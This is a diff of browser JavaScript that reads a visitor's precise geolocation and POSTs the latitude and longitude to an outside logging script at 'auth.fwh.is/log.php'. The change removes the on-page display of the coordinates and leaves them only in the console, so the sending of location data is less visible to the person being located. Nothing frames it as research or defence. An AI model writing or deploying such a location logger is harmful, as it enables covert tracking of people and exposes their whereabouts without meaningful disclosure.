@@ -1,47 +1,30 @@
 function getLocation() {
   if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition, showError, {
-      enableHighAccuracy: true,
-      timeout: 10000,
-      maximumAge: 0
-    });
+    navigator.geolocation.getCurrentPosition(
+      function (position) {
+        let lat = position.coords.latitude;
+        let lng = position.coords.longitude;
+
+        console.log("LAT:", lat, "LNG:", lng); // shows on frontend
+
+        // ✅ Send to InfinityFree log.php
+        fetch("https://auth.fwh.is/log.php", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          body: "lat=" + encodeURIComponent(lat) + "&lng=" + encodeURIComponent(lng)
+        })
+        .then(response => response.text())
+        .then(data => console.log("Server response:", data))
+        .catch(err => console.error("Error:", err));
+      },
+      function (error) {
+        console.error("Error getting location:", error);
+      },
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
   } else {
-    document.getElementById("location").innerText = "Geolocation is not supported by this browser.";
+    alert("Geolocation not supported.");
   }
 }
-
-function showPosition(position) {
-  let lat = position.coords.latitude;
-  let lng = position.coords.longitude;
-
-  document.getElementById("location").innerText =
-    "Latitude: " + lat + ", Longitude: " + lng;
-
-  // 🔥 Send data to InfinityFree backend
-  fetch("https://auth.fwh.is/log.php", {
-    method: "POST",
-    headers: { "Content-Type": "application/x-www-form-urlencoded" },
-    body: "lat=" + lat + "&lng=" + lng
-  })
-  .then(response => response.text())
-  .then(data => console.log("Server response:", data))
-  .catch(error => console.error("Error:", error));
-}
-
-function showError(error) {
-  switch(error.code) {
-    case error.PERMISSION_DENIED:
-      alert("User denied the request for Geolocation.");
-      break;
-    case error.POSITION_UNAVAILABLE:
-      alert("Location information is unavailable.");
-      break;
-    case error.TIMEOUT:
-      alert("The request to get user location timed out.");
-      break;
-    case error.UNKNOWN_ERROR:
-      alert("An unknown error occurred.");
-      break;
-  }
-}
-
